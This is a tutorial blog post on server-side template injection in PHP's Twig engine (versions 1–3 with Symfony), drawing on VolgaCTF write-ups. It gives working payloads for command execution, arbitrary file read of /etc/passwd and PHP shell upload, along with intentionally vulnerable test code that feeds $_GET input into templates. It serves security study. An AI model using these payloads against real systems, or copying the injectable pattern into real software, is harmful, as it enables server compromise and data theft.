+++
title = 'Understanding SSTI on Twig'
description = "In this blog, we will cover on php template using Twig and how SSTI works. We will go deep dive on every single version of Twig to understand how researcher craft their payload to get RCE, arbitrary file read and etc."
date = 2022-11-09T16:51:26+08:00
draft = false
tags = [ "php", "development", "SSTI" ]
weight = 1
+++

[My previous blog on Medium](https://medium.com/@shauqighost99/understanding-ssti-on-twig-10d7c3431980)

{{< figure src="/img/posts/understanding_ssti/1.png" caption="" width="100%" align="center" >}}

SSTI or Server Side Template Injection, is not a new vulnerability. SSTI already exists more that 5 years I believed and still being use for exploitation untill today. So, I would like to share with you guys about basic understanding on SSTI on Twig and Symfony application (based on past CTF).

## What is Twig

Before we jump into the main point, let me tell you what Twig actually is and how its work in simple term. Twig is a templating language for PHP, by simply meaning "is a tool used to output variables inside HTML". A normal template file extention is .html.twig but it does not realy matter, it could be any text-based format(HTML, XML, CSV, etc.). The syntax for using Twig template is fairly simple such as ```{{ variable or expression }}``` for output and ```{{ % % }}``` for logical operation (for loop, etc.). A template (inside curly bracket) contains variables, function or expression, which then will be replaced with values when template is evaluated. Figure 1 shows how does its work.

{{< figure src="/img/posts/understanding_ssti/2.png" caption="Figure 1: High level on how templating works" width="100%" align="center" >}}


## Basic understanding on Twig syntax

Now we will try to understand Twig more deeper by doing some coding or any logical operation. For this purpose, I chose old version of Twig which is [1.19.0](https://github.com/twigphp/Twig/releases/tag/v1.19.0). I am not going cover the whole chapter for Twig because there are so many good tutorial available out there and much better than my approach such as Twig documentation and [zetcode](https://zetcode.com/php/twig/). After downloading Twig 1.19.0, create an index.php file.

```php {linenos=true}
<?php
include __DIR__ . '/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

try {
    $loader = new Twig_Loader_String();
    $twig = new Twig_Environment($loader, [
        'debug' => true
    ]);
    $result = $twig->render('My name: {{ name }}!', [
        'name' => 'Twig'
    ]);
    echo($result . PHP_EOL);
} catch(Exception $e) {
    die('Error: '. $e->getMessage());
}
```

```bash
❯ php7.4 index.php
My name: Twig!
```

Based on terminal above, `render()` will generate output based on template expression, in this case is name variable. Besides accessing object specified, what else Twig can do? Let me introduce you to **Filter**.

### Filter

Filter is one of Twig’s core extension which are Tags, Filters, Functions and Tests. You can refer this [link](https://twig.symfony.com/doc/2.x/api.html#built-in-extensions) for more information about those features. Filter in simple term is allowing us to modify any data in multiple ways. Twig has their own built-in filter such as convert word to uppercase, encode urls, or reverse an array or string. Let take a look at simple [built-in](https://twig.symfony.com/doc/1.x/filters/index.html) filter which is upper.

```php {linenos=true}
<?php
include __DIR__ . '/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

try {
    $loader = new Twig_Loader_String();
    $twig = new Twig_Environment($loader, [
        'debug' => true
    ]);

    $result = $twig->render('My name: {{ name | upper }}!', [
        'name'  => 'Twig'
    ]);

    echo($result . PHP_EOL);
} catch(Exception $e) {
    die('Error: ' . $e->getMessage());
}
```

Noted that the syntax is different from before, like ```{{name|upper}}```. This basically means pass name value to upper filter, and display the result in raw format. The pipe ("|") meaning is to applies [filter](https://twig.symfony.com/doc/2.x/templates.html#other-operators).

```bash
❯ php7.4 index.php
My name: TWIG!
```

### Custom Filter

We also can use our own custom filter for specific task, for example, convert string to binary. By default, Twig built-in filter does not provide features to convert string to binary or vice versa, thus we can specify or implement our own filter to modify the data. First, we have to add filter (like registering new filter) to twig environment using `addFilter()`, then we can create the function. In order to use the filter in template, the format is just the same like before for example ```{{value|filter}}```.

```php {linenos=true}
<?php

include __DIR__ . '/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

try {
    $loader = new Twig_Loader_String();
    $twig = new Twig_Environment($loader, [
        'debug' => true
    ]);

    $twig->addFilter(new \Twig_SimpleFilter('ASCIIToBinary', 'ASCIIToBinary'));

    $result = $twig->render('{{ name }} in binary is ->{{ name | ASCIIToBinary }}!', [
        'name'  => 'Twig'
    ]);

    echo($result . PHP_EOL);
} catch(Exception $e) {
    die('Error: ' . $e->getMessage());
}

function ASCIIToBinary($text){
	$bin = array();
    for($i=0; strlen($text)>$i; $i++)
    	$bin[] = decbin(ord($text[$i]));

    return implode(' ',$bin);
}
```

```bash
❯ php7.4 index.php
Twig in binary is ->1010100 1110111 1101001 1100111!
```

The different between custom filter and built-in filter is it need to register the filter by using `addFilter()` function before we can use it.

That all for Twig 101, just like I said before, I am not gonna covering everything. So, lets go to the next phase.

---

## Server Side Template Injection on Twig
### TwigV1

After knowing a little bit on how Twig work and its basic syntax, lets bring our "hacker" mindset to think how to break the application until we gaining Remote Code Execution (RCE). Btw, [Portswigger](https://portswigger.net/research/server-side-template-injection) already wrote a decent explanation about SSTI on their blog so check it out.

Now, try to imagine that normal user can control the input before the system passing it to render() function , what would it can be?

Since we know that we can call filter, function and variable, how about we try to call global variable of the system such as `_self`, `_context` and `_charset`. Based on [documentation](https://twig.symfony.com/doc/1.x/templates.html#global-variables):

- `_self`: references the current template
- `_context`: references the current context
- `_charset`: references the current charset

In TwigV1, `_self` was an object, which you can call Twig macros with it or any template such as `_self._context`.

```php {linenos=true,linenostart=13}
// File: ./lib/Twig/Node/Expression/Name.php
protected $specialVars = array(
    '_self' => '$this',
    '_context' => '$context',
    '_charset' => '$this->env->getCharset()',
);
```

 In TwigV2, `_self` is just a string that holds current template name. Before that, I enable debug extension on line 10-12 in order to debug the application to understand more about Twig behavior. Surely you can use Xdebug or any debugging tools, but Twig already provide its own debug extension so why not. For example, if you want to debug certain variable, you can use `dump()` such as ```{{dump(var)}}```.

```php {linenos=true}
<?php

include __DIR__ . '/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

try {
    $loader = new Twig_Loader_String();
    $twig = new Twig_Environment($loader, [ // [1] enable debug
        'debug' => true
    ]);
    $twig->addExtension(new Twig_Extension_Debug());

    $result = $twig->render('{{_self}}', [
        'name'  => 'Twig'
    ]);

    echo($result . PHP_EOL);
} catch(Exception $e) {
    die('Error: ' . $e->getMessage());
}
```

```bash
❯ php7.4 index.php

Fatal error: Uncaught Error: Object of class __TwigTemplate_df03f98e7d3810bef6b1445843e89870cfa425bd9315bff283b76d1032eb6dd1 could not be converted to string in /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Environment.php(332) : eval()'d code:19
Stack trace:
#0 /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Template.php(333): __TwigTemplate_df03f98e7d3810bef6b1445843e89870cfa425bd9315bff283b76d1032eb6dd1->doDisplay(Array, Array)
#1 /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Template.php(307): Twig_Template->displayWithErrorHandling(Array, Array)
#2 /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Template.php(318): Twig_Template->display(Array)
#3 /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Environment.php(293): Twig_Template->render(Array)
#4 /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/index.php(15): Twig_Environment->render('{{_self}}', Array in /Users/ahmadshauqi/Documents/PHPProject/ValetServer/TwigTest/TwigV1/lib/Twig/Environment.php(332) : eval()'d code on line 19
```

Based on the result above, the application throw an error could not converted to string which is make sense since _self is an object not a string. To display the object data, use Twig debug function which is dump such as ```{{dump(_self)}}```. In this case, debug function may come handy.

`_self` object have many methods but we interested with env attribute, which refers to `Twig_Environment()`. If we look at Environment code on `/lib/Twig/Environment.php`, there is one interesting method that invoke function to execute code which is `call_user_func()` under `getFilter()` method.

{{< highlight php "linenos=true,linenostart=851,hl_lines=24-28" >}}
// File: ./lib/Twig/Environment.php
public function getFilter($name)
{
    if (!$this->extensionInitialized) {
        $this->initExtensions();
    }

    if (isset($this->filters[$name])) {
        return $this->filters[$name];
    }

    foreach ($this->filters as $pattern => $filter) {
        $pattern = str_replace('\\*', '(.*?)', preg_quote($pattern, '#'), $count);

        if ($count) {
            if (preg_match('#^'.$pattern.'$#', $name, $matches)) {
                array_shift($matches);
                $filter->setArguments($matches);

                return $filter;
            }
        }
    }

    foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {
            return $filter;
        }
    }

    return false;
}
{{</ highlight >}}

Based on snippet code above, on line 213-217, it will pass callback variable and name to `call_user_func($callback, $name)`. If you guys wondering how we can achieve code execution via call_user_func, it simply just call `call_user_func("system","id")`. The first parameter act like a callback which is any function, and the remaining parameters as arguments. Noted that the first parameter must be function which can be user user-defined or built-in function, not language construct such as `eval()` , `echo` , or `isset()`. Back to our topic, we can call getFilter via ```{{_self.env.getFilter("id")}}``` but the problem is we cannot control the `$callback` variable. Luckily, there is one method to add callback named `registerUndefinedFilterCallback($callback)` and it accept only one parameter to set it as callback function.

{{< highlight php "linenos=true,linenostart=883" >}}
// File: ./lib/Twig/Environment.php
public function registerUndefinedFilterCallback($callable)
{
    $this->filterCallbacks[] = $callable;
}
{{</ highlight >}}

After we set the callback, then we can call `getFilter("any command")` to execute the command. The payload will looks like ```{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}```.

{{< figure src="/img/posts/understanding_ssti/3.png" caption="Figure 2: SSTI payload illustration" width="90%" align="center" >}}


```php {linenos=true}
<?php

include __DIR__ . '/lib/Twig/Autoloader.php';

Twig_Autoloader::register();

$name = !empty($_GET["name"]) ? $_GET["name"] : "Anonymous";
$template = "
Hi <b>$name!</b>
<br>
Take a look at our articles. You will be amazed at their insights, tips and trends.
";

try {
    $loader = new Twig_Loader_String();
    $twig = new Twig_Environment($loader, [
        'debug' => true
    ]);
    $twig->addExtension(new Twig_Extension_Debug());

    $result = $twig->render($template, [
        'name'  => 'Twig'
    ]);

    echo($result . PHP_EOL);
} catch(Exception $e) {
    die('Error: ' . $e->getMessage());
}
```

Now to test this out, copy the snippet code above and run it with simple server like so:

```bash
php7.4 -S localhost:2222
```

{{< figure src="/img/posts/understanding_ssti/5.png" caption="Figure 3: Invoking RCE" width="100%" align="center" >}}

This is one of the ways to get RCE. Besides using filter, we also can use function to trigger `call_user_func()` since they share almost same logic code based on [this](https://twitter.com/11xuxx/status/1248905107267375104) tweet. The final payload will look like this ```{{_self.env.registerUndefinedFunctionCallback("system")}}{{_self.env.getFunction("id")}}```.

{{< figure src="/img/posts/understanding_ssti/6.png" caption="Figure 4: Tweet from @11xuxx on bypassing previous payload" width="100%" align="center" >}}

How about TwigV2? Can we use the same payload again?🤔

---

### TwigV2

In TwigV2, the payload that we used before is based on `_self` variable, because it has reference to current template and allow attacker to call any method on the objects. In TwigV2, `_self` does not an object anymore, it just a string variable and holds templates name. This will make our previous payload useless on TwigV2 because we cannot access template on string variable anymore.

```php {linenos=true,linenostart=18}
// File: ./vendor/twig/twig/src/Node/Expression/NameExpression.php
private $specialVars = [
    '_self' => '$this->getTemplateName()',
    '_context' => '$context',
    '_charset' => '$this->env->getCharset()',
];
```

In Twig2, we will use another approach to abuse current features like Twig’s Filters and Functions. I use Twig version 2.4.2 for testing. In this case, we going to abuse **new** ***Twig’s Core Extension*** which is `filter()` under Filters extension. You can refer [**here**](https://devdocs.io/twig~2-filters/) to understand more about TwigV2 filter. The `filter()` filter filters element of a sequence or a mapping using an arrow function. The arrow function receives the value of the sequence or mapping:

```twig
{% set ages = [11, 12, 13, 14, 15] %}

{{ ages|filter(x => x < 13)|join(', ') }}
{# output 11, 12 #}
```

The filter() filter accept two parameter which are array and arrow.
1. ***array***: The sequence or mapping.
2. ***arrow***: The arrow function.

The source code for handling `filter()` extension function is on `./vendor/twig/twig/src/Extension/CoreExtension.php`.

```php {linenos=true,linenostart=236,hl_lines=["8"]}
// array helpers
new TwigFilter('join', 'twig_join_filter'),
new TwigFilter('split', 'twig_split_filter', ['needs_environment' => true]),
new TwigFilter('sort', 'twig_sort_filter', ['needs_environment' => true]),
new TwigFilter('merge', 'twig_array_merge'),
new TwigFilter('batch', 'twig_array_batch'),
new TwigFilter('column', 'twig_array_column'),
new TwigFilter('filter', 'twig_array_filter', ['needs_environment' => true]),
new TwigFilter('map', 'twig_array_map', ['needs_environment' => true]),
new TwigFilter('reduce', 'twig_array_reduce', ['needs_environment' => true]),
```

If `filter()` extension was used such as previous example, the Twig will call `twig_array_filter()` function.

```php {linenos=true,linenostart=1604,hl_lines=["11-13"]}
// File: ./vendor/twig/twig/src/Extension/CoreExtension.php
function twig_array_filter(Environment $env, $array, $arrow)
{
    if (!twig_test_iterable($array)) {
        throw new RuntimeError(sprintf('The "filter" filter expects an array or "Traversable", got "%s".',
        \is_object($array) ? \get_class($array) : \gettype($array)));
    }

    twig_check_arrow_in_sandbox($env, $arrow, 'filter', 'filter');

    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

By reading `twig_array_filter()` function, the function will call `array_filter` if `$array` is an actual array. Otherwise, it will invoke `CallbackFilterIterator`. As you can see, we can control two parameters on `array_filter` which are `$array` and `$arrow`. Figure 5 explains about php `array_filter` or you can read it [**here**](https://www.php.net/manual/en/function.array-filter.php).

{{< figure src="/img/posts/understanding_ssti/7.png" caption="Figure 5: PHP array_filter description" width="75%" align="center" >}}

`array_filter` have three parameters, which are:
1. ***array***: The array to iterate over
2. ***callback***: The callback function to use. If no callback is supplied, all empty entries of array will be removed.
3. ***mode***: Flag determining what arguments are sent to callback:
    - `ARRAY_FILTER_USE_KEY`: pass key as the only argument to callback instead of the value
    - `ARRAY_FILTER_USE_BOTH`: pass both value and key as arguments to callback instead of the value

    Default is 0 which will pass value as the only argument to ***callback*** instead.

Since we can control the first and second parameter of `array_filter`, we can set ***callback*** parameter to call `system()` and array as arguments such as "id" . Thus, the payload will be like this ```{{["id"]|filter("system")}}``` .

{{< figure src="/img/posts/understanding_ssti/8.png" caption="Figure 6: SSTI payload illustration" width="90%" align="center" >}}

To test this payload, you can simply install Twig(version 2.4.2 in this case) and create an index.php file on root folder with code below.

```bash
❯ mkdir TwigV2 && cd TwigV2 && composer require "twig/twig:^2.4.2"
```

```php {linenos=true,linenostart=0}
// File: index.php
<?php

require __DIR__ . '/vendor/autoload.php';

use Twig\Environment;
use Twig\Loader\FilesystemLoader;
use Twig\Loader\ArrayLoader;

$name = !empty($_GET["name"]) ? $_GET["name"] : "Anonymous";
$template = "
Hi <b>$name!</b>
<br>
Take a look at our articles. You will be amazed at their insights, tips and trends.
";

$loader = new ArrayLoader([
    'index' => $template,
    'debug' => true
]);
$twig = new Environment($loader);
$twig->addExtension(new \Twig\Extension\DebugExtension());

echo $twig->render('index');
```

{{< figure src="/img/posts/understanding_ssti/9.png" caption="Figure 7: Code execution from SSTI payload on Twig version 2" width="100%" align="center" >}}

Noted that the arguments must be in array format( [] ) such as ```{{["id","ls -la","uname -a"]|filter("system")}}``` . The number of arguments can be 1, 2, or more.

What about Symfony framework? Can we exploit it using the same payload? The answer is, yes, we can, but we want to know other methods as well to gain code execution, file write/file read on TwigV3 + Symfony.

---

### TwigV3 + Symfony

[Symfony](https://en.wikipedia.org/wiki/Symfony) in simple term is a framework for building complex web application. It is widely used application framework among open-source developer and it also use numerous existing PHP open-source projects such as:
1. ***Propel or Doctrine***: object-relational mapping layers
2. ***PHPUnit***: a unit testing framework
3. ***Twig***: a templating engine
4. ***Swift Mailer***: an e-mail library

In this part, we going to use **symfony 5.0.5**, **Twig 3.0.3** and **PHP 7.*** for testing. Previously on 2020, there was a ctf event named **VolgaCTF** and they used symfony and twig for challenge, and we going to refer the question. Here is the list of CTF writeups (big kudos to them 👏):

1. [Writeup 1](https://blog-blackfan-ru.translate.goog/2020/03/volgactf-2020-qualifier-writeup.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp)
2. [Writeup 2](https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md)
3. [Writeup 3](https://blog.sometimenaive.com/2020/04/08/twig3.x-with-symfony-ssti-payloads/)

If you guys want to follow along, feel free to download my code for testing the payload. First, download symfony CLI binary [**here**](https://symfony.com/download). Then open terminal or cmd and follow the instructions below.

```bash
git clone https://github.com/nightfury99/Symfony_Test.git && \
cd Symfony_Test && \
composer install &&\
symfony server:start
```
After the server started, navigate to `localhost:8080/home` and you will get webpage like Figure 8.

{{< figure src="/img/posts/understanding_ssti/10.png" caption="Figure 8: Symfony start successfully" width="100%" align="center" >}}

> If you get an error while running the symfony, most likely is because php version. By default, Symfony will take php version from `$PATH`. If your current php is php 8, consider to relink it to php 7 (refer [**here**](https://stackoverflow.com/questions/32482664/symfony-is-linked-to-the-wrong-php-version)). Otherwise, please update the PHP version in the "require" section to "8.1.*":
>```composer
>"require": {
>    ...
>    "php": "8.1.*",
>    ...
>},
>```

The source code for the `/home` route controller is located on `./src/Controller/HomeController.php` and `./templates/home/index.html.twig` is for its template. You can play around with Twig syntax first before get started.

### Arbitrary File Read

In Symfony, there are many [**Twig extensions defined by Symfony**](https://symfony.com/doc/5.x/reference/twig_reference.html) as shown as Figure 9 such as ***Functions*** and ***Filters***.

{{< figure src="/img/posts/understanding_ssti/11.png" caption="Figure 10: Twig extensions defined by Symfony" width="70%" align="center" >}}

There is one interesting filter that able to read file which is `file_excerpt` filter. Based on [**documentation**](https://symfony.com/doc/5.x/reference/twig_reference.html#file-excerpt), below is how the definition of `file_excerpt` filter:

```
{{ file|file_excerpt(line, srcContext = 3) }}
```
- `file`
   - **type**: `string`
- `line`
    - **type**: `integer`
- `srcContext` (optional)
    - **type**: `integer`

Generates the file path inside an <a> element. If the path is inside the kernel root directory, the kernel root directory path is replaced by kernel.project_dir (showing the full path in a tooltip on hover).

`file_excerpt()` requires filename to read, line number and total lines number to display, if we want to display the whole file, use -1 instead. So we can read any file using `file_excerpt()` like:

```php
{{ "/etc/passwd"|file_excerpt(-1,-1) }}
```

{{< figure src="/img/posts/understanding_ssti/12.png" caption="Figure 10: Arbitrary file read" width="100%" align="center" >}}

By looking at the implementation of `file_excerpt`, the source code is self explanatory.

```php {linenos=true,linenostart=119,hl_lines=["4","7"]}
// File: ./vendor/symfony/twig-bridge/Extension/CodeExtension.php
public function fileExcerpt(string $file, int $line, int $srcContext = 3): ?string
{
    if (is_file($file) && is_readable($file)) {
        // highlight_file could throw warnings
        // see https://bugs.php.net/25725
        $code = @highlight_file($file, true);
        // remove main code/span tags
        $code = preg_replace('#^<code.*?>\s*<span.*?>(.*)</span>\s*</code>#s', '\\1', $code);
        // split multiline spans
        $code = preg_replace_callback('#<span ([^>]++)>((?:[^<]*+<br \/>)++[^<]*+)</span>#', function ($m) {
            return "<span $m[1]>".str_replace('<br />', "</span><br /><span $m[1]>", $m[2]).'</span>';
        }, $code);
        $content = explode('<br />', $code);

        $lines = [];
        if (0 > $srcContext) {
            $srcContext = \count($content);
        }

        for ($i = max($line - $srcContext, 1), $max = min($line + $srcContext, \count($content)); $i <= $max; ++$i) {
            $lines[] = '<li'.($i == $line ? ' class="selected"' : '').'><a class="anchor" id="line'.$i.'"></a><code>'.self::fixCodeMarkup($content[$i - 1]).'</code></li>';
        }

        return '<ol start="'.max($line - $srcContext, 1).'">'.implode("\n", $lines).'</ol>';
    }

    return null;
}
```

### Arbitrary File Upload / Arbitrary File Write

Arbitrary file write and arbitrary file upload is a type of security flaw that allow attackers to upload any kind of file that contains malicious code onto a server. Symfony has their own custom method to upload file to make developer task more easier and cleaner.

If we look back on our previous exploit on TwigV1, we are using `_self` global variable to access certain method but on the other version like TwigV2 and above, it cannot be used. Symfony also have their own global variable which is `app` (refer Figure 9). Based on Figure 11, Symfony creates a context object that is injected into every Twig template automatically as a variable called `app`.

{{< figure src="/img/posts/understanding_ssti/13.png" caption="Figure 11: Global variable for Symfony" width="75%" align="center" >}}

Symfony [documentation](https://symfony.com/doc/current/templates.html#twig-app-variable) explain the app variable gives you access to these variables:

1. `app.user` : The [**current user object**](https://symfony.com/doc/current/security.html#create-user-class) or null if the user is not authenticated.
2. `app.request` : The [**Request**](https://github.com/symfony/symfony/blob/6.1/src/Symfony/Component/HttpFoundation/Request.php) object that stores the current [request data](https://symfony.com/doc/current/components/http_foundation.html#accessing-request-data).
3. `app.session` : The [**Session**](https://github.com/symfony/symfony/blob/6.1/src/Symfony/Component/HttpFoundation/Session/Session.php) object that represents the current [**user’s session**](https://symfony.com/doc/current/session.html) or null if there is none.
4. `app.flashes` : An array of all the [**flash messages**](https://symfony.com/doc/current/controller.html#flash-messages) stored in the session.
5. `app.environment` : The name of the current [**configuration environment**](https://symfony.com/doc/current/configuration.html#configuration-environments) (dev, prod, etc).
6. `app.debug` : True if in [**debug mode**](https://symfony.com/doc/current/configuration/front_controllers_and_kernel.html#debug-mode). False otherwise.
7. `app.token` : A [**TokenInterface**](https://github.com/symfony/symfony/blob/6.1/src/Symfony/Component/Security/Core/Authentication/Token/TokenInterface.php) object representing the security token.

We are interested with `app.request` object because its hold information of client request (which user can control the input request) and below are the information that be accessed via several public properties.

- `request`: equivalent of `$_POST`;
- `query`: equivalent of `$_GET` (`$request->query->get('name')`)
- `cookies`: equivalent of `$_COOKIE`
- `attributes`: no equivalent - used by your app to store other data
- `files`: equivalent of `$_FILES`
- `server`: equivalent of `$_SERVER`
- `headers`: mostly equivalent to a subset of `$_SERVER` (`$request->headers->get('User-Agent')`)

The `files` property is identical to `$_FILES`, which implies it handles file uploads. This means that users can access the function and upload any type of file into the server. For example, if we use `app.request.files` and send a post request to upload a file, it will return an object with the user's file request and some additional metadata.

{{< figure src="/img/posts/understanding_ssti/14.png" caption="Figure 12: app.requests.files object response" width="100%" align="center" >}}

Based on Figure 12, `files` object uses ***FileBag***(green box) instance to handle file upload. Inside ***FileBag***, it has an object storing user's requests under `UploadedFile` object(blue box) such as **originalName**, **mimeType**, **fileName** and **pathName**.

If we inspect `UploadedFile` class source code (located at `./vendor/symfony/http-foundation/File/UploadedFile.php`), there are ten public methods available to access such as:

```bash
❯ cat ./vendor/symfony/http-foundation/File/UploadedFile.php | grep public
    public function __construct(string $path, string $originalName, string $mimeType = null, int $error = null, bool $test = false)
    public function getClientOriginalName()
    public function getClientOriginalExtension()
    public function getClientMimeType()
    public function guessClientExtension()
    public function getError()
    public function isValid()
    public function move(string $directory, string $name = null)
    public static function getMaxFilesize()
    public function getErrorMessage()
```

Apart from those method, only one method looks interesting to me which is `move()` method. It accept two parameters which are `$directory` and `$name`. The interesting part is when we can control the filename, file location to upload and directory name. If user provide directory that does not exist, symfony will create a new one with `0666` permissions.

```php {linenos=true,linenostart=175,hl_lines=["13"]}
// File: ./vendor/symfony/http-foundation/File/UploadedFile.php
public function move(string $directory, string $name = null)
{
    if ($this->isValid()) {
        if ($this->test) {
            return parent::move($directory, $name);
        }

        $target = $this->getTargetFile($directory, $name);

        set_error_handler(function ($type, $msg) use (&$error) { $error = $msg; });
        try {
            $moved = move_uploaded_file($this->getPathname(), $target);
        } finally {
            restore_error_handler();
        }
        if (!$moved) {
            throw new FileException(sprintf('Could not move the file "%s" to "%s" (%s).', $this->getPathname(), $target, strip_tags($error)));
        }

        @chmod($target, 0666 & ~umask());

        return $target;
    }
...
```

The base directory for upload file for `move()` method is under `public/` directory. In order to upload file arbitrarily, we can simply access `move()` method like so:

```php
{{app.request.files.get("something").move("newDirectory", "newFile.php")}}
```

{{< figure src="/img/posts/understanding_ssti/15.png" caption="Figure 13: Arbitrary File Upload" width="100%" align="center" >}}

{{< figure src="/img/posts/understanding_ssti/16.png" caption="Figure 14: Executing uploaded shell" width="100%" align="center" >}}

### Remote Code Execution

As we all know, Symfony has global variable like `app`(refer Figure 11), and we already get arbitrary file upload. To achieve code execution, we going to abuse `query()` property under ***Request*** object and ***InputBag*** instance. In case you guys want to understand about how Symfony handle request data, you can refer [here](https://symfony.com/doc/current/components/http_foundation.html#accessing-request-data). Upon reading **InputBag**'s source code, there is a filter method to filter key and the most important thing is, it uses [`filter_var`](https://www.php.net/manual/en/function.filter-var.php) method from php. `filter_var` can accept callback to call any function, thus, user would be able to call "system" to execute OS command.

```php {linenos=true,linenostart=88,hl_lines=24}
// File: ./vendor/symfony/http-foundation/InputBag.php
public function filter(string $key, $default = null, int $filter = \FILTER_DEFAULT, $options = [])
{
    $value = $this->has($key) ? $this->all()[$key] : $default;

    // Always turn $options into an array - this allows filter_var option shortcuts.
    if (!\is_array($options) && $options) {
        $options = ['flags' => $options];
    }

    if (\is_array($value) && !(($options['flags'] ?? 0) & (\FILTER_REQUIRE_ARRAY | \FILTER_FORCE_ARRAY))) {
        trigger_deprecation('symfony/http-foundation', '5.1', 'Filtering an array value with "%s()" without passing the FILTER_REQUIRE_ARRAY or FILTER_FORCE_ARRAY flag is deprecated', __METHOD__);

        if (!isset($options['flags'])) {
            $options['flags'] = \FILTER_REQUIRE_ARRAY;
        }
    }

    if ((\FILTER_CALLBACK & $filter) && !(($options['options'] ?? null) instanceof \Closure)) {
        trigger_deprecation('symfony/http-foundation', '5.2', 'Not passing a Closure together with FILTER_CALLBACK to "%s()" is deprecated. Wrap your filter in a closure instead.', __METHOD__);
        // throw new \InvalidArgumentException(sprintf('A Closure must be passed to "%s()" when FILTER_CALLBACK is used, "%s" given.', __METHOD__, get_debug_type($options['options'] ?? null)));
    }

    return filter_var($value, $filter, $options);
}
```

The explanation is pretty straight forward. `filter_var()` function can call any PHP functions as long we use **FILTER_CALLBACK** as the first arguments. You can refer here to understand more about PHP type of [filters](https://www.php.net/manual/en/filter.filters.php). Noted that the filter must be in integer, thus, **FILTER_CALLBACK** in integer is 1024. The final payload will look like this:

```php
{{app.request.query.filter(0,"id",1024,{"options":"system"})}}
```

{{< figure src="/img/posts/understanding_ssti/17.png" caption="Figure 15: Remote code execution" width="100%" align="center" >}}

## References
- https://devdocs.io/twig~2/filters/filter
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://www.symfonystation.com/Twig-Ultimate-Guide-PHP-Templating-Language
- https://blog-blackfan-ru.translate.goog/2020/03/volgactf-2020-qualifier-writeup.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp
- https://portswigger.net/research/server-side-template-injection
- https://devdocs.io/twig~2
- https://github-com.translate.goog/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp
- https://blog.sometimenaive.com/2020/04/08/twig3.x-with-symfony-ssti-payloads/
